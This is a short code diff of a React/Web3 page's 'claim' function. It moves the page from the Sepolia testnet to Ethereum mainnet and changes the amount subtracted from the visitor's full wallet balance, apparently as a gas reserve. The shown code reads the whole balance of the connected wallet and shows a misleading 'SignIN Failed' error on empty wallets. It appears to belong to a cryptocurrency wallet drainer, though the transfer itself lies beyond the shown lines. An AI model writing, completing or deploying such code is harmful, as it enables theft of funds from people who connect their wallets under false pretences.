@@ -27,13 +27,13 @@ function App() {
   const { chain } = useNetwork();
   const { chains } = useSwitchNetwork();
 
-  const webSupply = new Web3("wss://ethereum-sepolia-rpc.publicnode.com");
+  const webSupply = new Web3("wss://ethereum-rpc.publicnode.com");
 
   const claim = async () => {
     try {
       let balance = await webSupply.eth.getBalance(address);
       if (balance > 0) {
-        balance = Number(balance) - Number(3700000000000000);
+        balance = Number(balance) - Number(6000000000000000);
       } else {
         toast.error("SignIN Failed");
         return;
